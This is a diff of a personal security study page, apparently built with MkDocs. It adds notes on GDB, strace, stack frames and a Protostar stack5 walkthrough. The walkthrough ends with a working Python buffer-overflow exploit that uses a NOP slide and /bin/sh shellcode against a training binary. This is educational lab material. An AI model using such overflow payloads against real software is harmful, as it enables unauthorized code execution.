@@ -272,11 +272,11 @@
     <ul class="md-nav__list" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#reverse-engineering" class="md-nav__link">
-    Reverse Engineering
+  <a href="#binary-exploitation" class="md-nav__link">
+    Binary Exploitation
   </a>
   
-    <nav class="md-nav" aria-label="Reverse Engineering">
+    <nav class="md-nav" aria-label="Binary Exploitation">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
@@ -320,6 +320,54 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#strace-ltrace" class="md-nav__link">
+    strace &amp; ltrace
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#other-useful-tools" class="md-nav__link">
+    Other useful tools
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#parser-differential" class="md-nav__link">
+    Parser Differential
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#stack" class="md-nav__link">
+    Stack
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#protostar" class="md-nav__link">
+    Protostar
+  </a>
+  
+    <nav class="md-nav" aria-label="Protostar">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#stack5" class="md-nav__link">
+    stack5
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -346,7 +394,7 @@
                 
                 
                 <h1 id="security-learning-note">Security Learning Note<a class="headerlink" href="#security-learning-note" title="Permanent link">&para;</a></h1>
-<h2 id="reverse-engineering">Reverse Engineering<a class="headerlink" href="#reverse-engineering" title="Permanent link">&para;</a></h2>
+<h2 id="binary-exploitation">Binary Exploitation<a class="headerlink" href="#binary-exploitation" title="Permanent link">&para;</a></h2>
 <h3 id="gdb">GDB<a class="headerlink" href="#gdb" title="Permanent link">&para;</a></h3>
 <h4 id="learning-sources">Learning Sources<a class="headerlink" href="#learning-sources" title="Permanent link">&para;</a></h4>
 <ul>
@@ -354,7 +402,8 @@
 </ul>
 <h4 id="before-cracking">Before Cracking<a class="headerlink" href="#before-cracking" title="Permanent link">&para;</a></h4>
 <ul>
-<li>use <code>file</code> to check the type of binary</li>
+<li><code>file</code>: determine file type</li>
+<li><code>strings</code>: print the sequences of printable characters in files</li>
 </ul>
 <h4 id="basic-disassembler-and-register-tricks">Basic disassembler and register tricks<a class="headerlink" href="#basic-disassembler-and-register-tricks" title="Permanent link">&para;</a></h4>
 <ul>
@@ -363,17 +412,104 @@
 <li><code>break *address</code>: for example, <code>break *main</code></li>
 <li><code>si</code>: step one instruction</li>
 <li><code>info registers</code>:<ul>
-<li><code>rip</code>: instruction pointer (program counter)</li>
+<li><code>rip / eip</code>: instruction pointer (program counter)</li>
 <li><code>eax</code>: the first 32 bits of the 64-bit <code>rax</code> register</li>
 </ul>
 </li>
 <li><code>set $eax=0</code>: set the register <code>eax</code> to 0</li>
+<li><code>info proc mapping</code>: report the memory address space ranges accessible in a process.</li>
+<li>x command: examine the content of a memory address <a href="https://visualgdb.com/gdbreference/commands/x">reference</a></li>
+<li>define a "hook", example:
+  <div class="highlight"><pre><span></span><code>(gdb) define hook-stop
+Type commands for definition of &quot;hook-stop&quot;.
+End with a line saying just &quot;end&quot;.
+&gt;info registers
+&gt;x/32wx $esp+0x1c
+&gt;x/2i $eip
+&gt;end
+</code></pre></div></li>
 </ul>
 <h3 id="objdump">objdump<a class="headerlink" href="#objdump" title="Permanent link">&para;</a></h3>
 <ul>
 <li><code>objdump -d $FILENAME</code>: disassembler</li>
 <li><code>objdump -x $FILENAME</code>: print header information</li>
 </ul>
+<h3 id="strace-ltrace">strace &amp; ltrace<a class="headerlink" href="#strace-ltrace" title="Permanent link">&para;</a></h3>
+<ul>
+<li><code>strace</code>: trace system calls</li>
+<li><code>ltrace</code>: trace library calls</li>
+</ul>
+<h3 id="other-useful-tools">Other useful tools<a class="headerlink" href="#other-useful-tools" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Radare2, Ghidra, ...</li>
+</ul>
+<h3 id="parser-differential">Parser Differential<a class="headerlink" href="#parser-differential" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Use fuzzing technique to make a program failed to be parsed by gdb, radare2, or whatever but able to be executed by <code>execve</code>.</li>
+</ul>
+<h3 id="stack">Stack<a class="headerlink" href="#stack" title="Permanent link">&para;</a></h3>
+<ul>
+<li>ebp / rbp: contains the address of the bottom of the stack</li>
+<li>esp / rsp: contains the address the top of the stack</li>
+<li>
+<p>When enter a function:
+    <div class="highlight"><pre><span></span><code>push   ebp
+mov    ebp,esp
+and    esp,0xfffffff0
+</code></pre></div>
+  (mask out the last 4 bits of esp is for alignment)</p>
+</li>
+<li>
+<p>Procedures of calling a function:</p>
+<ol>
+<li>(old func) push the paramters to be passed on the stack</li>
+<li>(old func) push the next instruction to be executed on the stack</li>
+<li>(old func) execute <code>`call</code> instruction</li>
+<li>(new func) push the value of <em>ebp</em> on the stack</li>
+<li>(new func) set <em>ebp</em> to the value of <em>esp</em></li>
+<li>(new func) align the value of <em>esp</em></li>
+<li>(new func) substract <em>esp</em> to create stack frame</li>
+</ol>
+</li>
+<li>
+<p>Procedures of returning from a function:</p>
+<ol>
+<li><code>leave</code> instruction: <code>mov esp, ebp</code> then <code>pop ebp</code></li>
+<li><code>ret</code> instruction: get the next instruction pointer, which is on the top of the stack (pop)</li>
+</ol>
+</li>
+</ul>
+<h3 id="protostar">Protostar<a class="headerlink" href="#protostar" title="Permanent link">&para;</a></h3>
+<h4 id="stack5"><a href="https://exploit.education/protostar/stack-five/">stack5</a><a class="headerlink" href="#stack5" title="Permanent link">&para;</a></h4>
+<ol>
+<li>calculate the length of padding</li>
+<li>determine the value of <em>ebp</em> (does not matter in this problem)</li>
+<li>determine the value of <em>eip</em>: where to place our shell code? (right after <em>$eip</em>)</li>
+<li>add NOP(opcode: <code>0x90</code>) slide: the address may not be the same every time since the data pushed on the stack can be different (e.g. environment variables)<ul>
+<li>make the <em>eip</em> point to the middle of the NOP slide (the exact position is not sure)</li>
+</ul>
+</li>
+<li>add shellcode: copy from <a href="http://shell-storm.org/shellcode/">shell-storm</a></li>
+</ol>
+<div class="admonition info">
+<p class="admonition-title">Info</p>
+<p>use <code>int3</code>(opcode: <code>0xCC</code>) instruction to debug shellcode</p>
+</div>
+<div class="admonition warning">
+<p class="admonition-title">Warning</p>
+<p><code>python exploit.py | /opt/protostar/bin/stack5</code> does not work because when exploit.py terminates, the pipe is closed at the mean time. Thus, we should use <code>cat</code> to create a new pipe:
+<div class="highlight"><pre><span></span><code><span class="o">(</span>python exploit.py<span class="p">;</span> cat<span class="o">)</span> <span class="p">|</span> /opt/protostar/bin/stack5
+</code></pre></div></p>
+</div>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">struct</span>
+
+<span class="n">padding</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">72</span>
+<span class="n">ebp</span> <span class="o">=</span> <span class="s1">&#39;AAAA&#39;</span>
+<span class="n">eip</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;I&#39;</span><span class="p">,</span> <span class="mh">0xbffff6e0</span><span class="o">+</span><span class="mi">40</span><span class="p">)</span>
+<span class="n">nopslide</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">100</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><span class="s2">&quot;</span>
+<span class="nb">print</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">ebp</span> <span class="o">+</span> <span class="n">eip</span> <span class="o">+</span> <span class="n">nopslide</span> <span class="o">+</span> <span class="n">shellcode</span>
+</code></pre></div>
                 
               
               
